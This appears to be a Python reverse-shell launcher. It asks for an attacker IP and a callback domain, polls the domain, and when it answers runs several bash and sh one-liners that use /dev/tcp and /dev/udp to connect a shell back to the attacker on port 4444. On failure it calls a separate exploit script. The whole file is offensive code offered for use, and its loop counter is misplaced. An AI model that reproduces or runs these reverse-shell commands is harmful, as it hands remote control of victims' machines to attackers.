import requests
import time
import os
os.system("bash banner.sh")
user = input("Enter attacker IP address: ")
response = input("Enter reverse connection domain: ")
ip = open("ip.txt", "w")
ip.write(user)
ip.close()
domain = open("domain.txt", "w")
domain.write(response)
domain.close()
while True:
    try:
        r = requests.get(response)
        s = r.status_code
        print(s)
        if s == 200:
             a = 0
             while a < 10:
                 time.sleep(1)
                 os.system(f"bash -c 'bash -i >& /dev/tcp/{user}/4444 0>&1'")
                 if a == 2:
                     os.system(f"bash -c '0<&196;exec 196<>/dev/tcp/{user}/4444; sh <&196 >&196 2>&196'")
                 if a == 3:
                     os.system(f"bash -c 'exec 5<>/dev/tcp/{user}/4444;cat <&5 | while read line; do $line 2>&5 >&5; done'")
                 if a == 4:
                     os.system(f"bash -c 'sh -i 5<> /dev/tcp/{user}/4444 0<&5 1>&5 2>&5'")
                 if a == 5:
                     os.system(f"bash -c 'sh -i >& /dev/udp/{user}/4444 0>&1'")  # optional
             a += 1

    except:
        time.sleep(1)
        os.system("python3 exploit.py")
